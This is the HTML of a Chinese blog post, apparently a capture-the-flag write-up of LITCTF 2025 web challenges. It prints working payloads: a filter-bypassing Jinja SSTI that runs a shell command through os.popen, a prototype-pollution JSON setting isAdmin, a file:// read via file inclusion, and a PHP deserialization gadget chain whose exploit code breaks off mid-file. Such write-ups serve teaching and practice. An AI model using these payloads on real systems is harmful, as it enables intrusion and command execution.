@@ -1,0 +1,720 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/b_1df622db11162cfed5e7fc2f7b420526.jpg">
+  <link rel="icon" href="/img/b_1df622db11162cfed5e7fc2f7b420526.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CXCX">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="easy_file 弱口令进入  文件上传，这里过滤了ph字符，但是在主页面中发现传参  file能够查看头像。我们尝试上传一个jpg  过滤了&lt;?php  成功上传，尝试包含。   nest_js 还是弱口令  星愿信箱是ssti，过滤了 &#123;&#123;&#125;&#125;  &#123;%print(lipsum.__globals__.__builtins__[&#39;__im">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LITCTF 2025">
+<meta property="og:url" content="https://r3bir7hcx.github.io/2025/05/30/LITCTF-2025/index.html">
+<meta property="og:site_name" content="CXCX&#39;s Singularity">
+<meta property="og:description" content="easy_file 弱口令进入  文件上传，这里过滤了ph字符，但是在主页面中发现传参  file能够查看头像。我们尝试上传一个jpg  过滤了&lt;?php  成功上传，尝试包含。   nest_js 还是弱口令  星愿信箱是ssti，过滤了 &#123;&#123;&#125;&#125;  &#123;%print(lipsum.__globals__.__builtins__[&#39;__im">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://r3bir7hcx.github.io/img/articleImg/12.jpg">
+<meta property="article:published_time" content="2025-05-30T05:37:29.000Z">
+<meta property="article:modified_time" content="2025-05-30T07:00:43.692Z">
+<meta property="article:author" content="CXCX">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://r3bir7hcx.github.io/img/articleImg/12.jpg">
+  
+  
+  
+  <title>LITCTF 2025 - CXCX&#39;s Singularity</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"r3bir7hcx.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CXCX&#39;s Singularity</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://api.dujin.org/bing/1366.php') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="LITCTF 2025"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-30 13:37" pubdate>
+          May 30, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">LITCTF 2025</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="easy-file"><a href="#easy-file" class="headerlink" title="easy_file"></a>easy_file</h1><p><img src="/img/LITCTF-2025/image-20250530133906284.png" srcset="/img/loading.gif" lazyload></p>
+<p>弱口令进入</p>
+<p><img src="/img/LITCTF-2025/image-20250530133926108.png" srcset="/img/loading.gif" lazyload></p>
+<p>文件上传，这里过滤了<code>ph</code>字符，但是在主页面中发现传参</p>
+<p><img src="/img/LITCTF-2025/image-20250530134201277.png" srcset="/img/loading.gif" lazyload></p>
+<p>file能够查看头像。我们尝试上传一个<code>jpg</code></p>
+<p><img src="/img/LITCTF-2025/image-20250530134242633.png" srcset="/img/loading.gif" lazyload></p>
+<p>过滤了<code>&lt;?php</code></p>
+<p><img src="/img/LITCTF-2025/image-20250530134257367.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功上传，尝试包含。</p>
+<p><img src="/img/LITCTF-2025/image-20250530134418723.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/LITCTF-2025/image-20250530134446992.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a>nest_js</h1><p><img src="/img/LITCTF-2025/image-20250530134515071.png" srcset="/img/loading.gif" lazyload></p>
+<p>还是弱口令</p>
+<p><img src="/img/LITCTF-2025/image-20250530134525725.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="星愿信箱"><a href="#星愿信箱" class="headerlink" title="星愿信箱"></a>星愿信箱</h1><p>是ssti，过滤了 <code>&#123;&#123;&#125;&#125;</code></p>
+<p><img src="/img/LITCTF-2025/image-20250530134804708.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>&#123;%print(lipsum.__globals__.__builtins__['__import__']('os').popen('tac /flag ').read())%&#125;</code></p>
+<h1 id="多重宇宙日记"><a href="#多重宇宙日记" class="headerlink" title="多重宇宙日记"></a>多重宇宙日记</h1><p>原型链污染</p>
+<p><img src="/img/LITCTF-2025/image-20250530134834588.png" srcset="/img/loading.gif" lazyload></p>
+<p>随意注册一下</p>
+<p>在这里发送json数据会进行更新</p>
+<p><img src="/img/LITCTF-2025/image-20250530134855929.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 更新表单的JS提交</span><br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;profileUpdateForm&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>            event.<span class="hljs-title function_">preventDefault</span>();<br>            <span class="hljs-keyword">const</span> statusEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;updateStatus&#x27;</span>);<br>            <span class="hljs-keyword">const</span> currentSettingsEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;currentSettings&#x27;</span>);<br>            statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;正在更新...&#x27;</span>;<br><br>            <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(event.<span class="hljs-property">target</span>);<br>            <span class="hljs-keyword">const</span> settingsPayload = &#123;&#125;;<br>            <span class="hljs-comment">// 构建 settings 对象，只包含有值的字段</span><br>            <span class="hljs-keyword">if</span> (formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;theme&#x27;</span>)) settingsPayload.<span class="hljs-property">theme</span> = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;theme&#x27;</span>);<br>            <span class="hljs-keyword">if</span> (formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;language&#x27;</span>)) settingsPayload.<span class="hljs-property">language</span> = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;language&#x27;</span>);<br>            <span class="hljs-comment">// ...可以添加其他字段</span><br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/profile/update&#x27;</span>, &#123;<br>                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                    <span class="hljs-attr">headers</span>: &#123;<br>                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>                    &#125;,<br>                    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">settings</span>: settingsPayload &#125;) <span class="hljs-comment">// 包装在 &quot;settings&quot;键下</span><br>                &#125;);<br>                <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                    statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;成功: &#x27;</span> + result.<span class="hljs-property">message</span>;<br>                    currentSettingsEl.<span class="hljs-property">textContent</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result.<span class="hljs-property">settings</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);<br>                    <span class="hljs-comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span><br>                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>(), <span class="hljs-number">1000</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;错误: &#x27;</span> + result.<span class="hljs-property">message</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请求失败: &#x27;</span> + error.<span class="hljs-title function_">toString</span>();<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">// 发送原始JSON的函数</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendRawJson</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">const</span> rawJson = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;rawJsonSettings&#x27;</span>).<span class="hljs-property">value</span>;<br>            <span class="hljs-keyword">const</span> statusEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;rawJsonStatus&#x27;</span>);<br>            <span class="hljs-keyword">const</span> currentSettingsEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;currentSettings&#x27;</span>);<br>            statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;正在发送...&#x27;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> parsedJson = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(rawJson); <span class="hljs-comment">// 确保是合法的JSON</span><br>                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/profile/update&#x27;</span>, &#123;<br>                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                    <span class="hljs-attr">headers</span>: &#123;<br>                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>                    &#125;,<br>                    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(parsedJson) <span class="hljs-comment">// 直接发送用户输入的JSON</span><br>                &#125;);<br>                <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                    statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;成功: &#x27;</span> + result.<span class="hljs-property">message</span>;<br>                    currentSettingsEl.<span class="hljs-property">textContent</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result.<span class="hljs-property">settings</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);<br>                     <span class="hljs-comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span><br>                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>(), <span class="hljs-number">1000</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;错误: &#x27;</span> + result.<span class="hljs-property">message</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                 statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请求失败或JSON无效: &#x27;</span> + error.<span class="hljs-title function_">toString</span>();<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过前端js源码发现，在<code>settings</code>下设置原型中的<code>isAdmin</code> 为 <code>true即可</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/LITCTF-2025/image-20250530135052211.png" srcset="/img/loading.gif" lazyload></p>
+<p>发送之后，导航栏会出现一个新的选项。</p>
+<p><img src="/img/LITCTF-2025/image-20250530135104445.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/LITCTF-2025/image-20250530135108565.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag。</p>
+<h1 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h1><p>进入页面是403，进行目录扫描 </p>
+<p><img src="/img/LITCTF-2025/image-20250530135637897.png" srcset="/img/loading.gif" lazyload></p>
+<p>有一个<code>login.php</code></p>
+<p><img src="/img/LITCTF-2025/image-20250530135653673.png" srcset="/img/loading.gif" lazyload></p>
+<p>说参数不完整.</p>
+<p>访问<code>login.html</code></p>
+<p><img src="/img/LITCTF-2025/image-20250530135758414.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里有一个<code>api.js</code></p>
+<p><img src="/img/LITCTF-2025/image-20250530135810520.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/LITCTF-2025/image-20250530135927278.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以包含。读当前文件<code>file:///var/www/html/api/sys/urlcode.php</code></p>
+<p><img src="/img/LITCTF-2025/image-20250530140054821.png" srcset="/img/loading.gif" lazyload></p>
+<p>有一个php文件，尝试访问</p>
+<p><img src="/img/LITCTF-2025/image-20250530140122237.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接访问即可。</p>
+<h1 id="君の名は"><a href="#君の名は" class="headerlink" title="君の名は"></a>君の名は</h1><blockquote>
+<p>考察点为：简单php魔术方法</p>
+<p>匿名函数如果没有设置返回值，可以通过调用生成的函数名执行其中的代码。匿名函数名会被设置为<code>\00lambda_%d</code> ，其中%d是递增的，但存在最大长度，如果达到最大长度那么会刷新为1.</p>
+<p>反射方法调用匿名函数：ReflectionFuntion::invoke() </p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$magic</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;musubi = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;musubi&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;magic = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;magic&#x27;</span>];<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;musubi)();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$thread</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;memory.<span class="hljs-variable language_">$this</span>-&gt;thread;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$kuchikamizake</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;call error!no flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$Litctf2025</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Litctf2025&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$Litctf2025</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Litctf2025</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure>
+
+
+
+<p>首先第一个正则检测O开头，这里可以使用<code>C</code>绕过，其次由于此题目php版本较高，所以对属性修饰符不敏感，可以把<code>private</code>修改为<code>public</code></p>
+<p>那么先来分析链子。</p>
+<p>首先当我们传入参数后会执行<code>unserialize函数</code>，那么会调用<code>Taki::__unserialize</code>，在这个函数中可以利用<code>($this-&gt;musubi)();</code>，将musubi设置为<code>Mitsuha</code>,就会调用<code>Mitsuha::invoke</code>，然后由于<code>$this-&gt;memory.$this-&gt;thread;</code>进行字符串拼接，此时让<code>thread</code>为 <code>new KatawareDoki()</code> 即可调用到 <code>KatawareDoki::__toString</code>。然后通过此函数中不存在的函数<code>flag</code> 调用到 <code>Taki::__call</code>，new 一个<code>ReflectionFunction</code>函数进行调用到匿名函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$magic</span> = <span class="hljs-string">&quot;invoke&quot;</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$memory</span>;<br>    <span 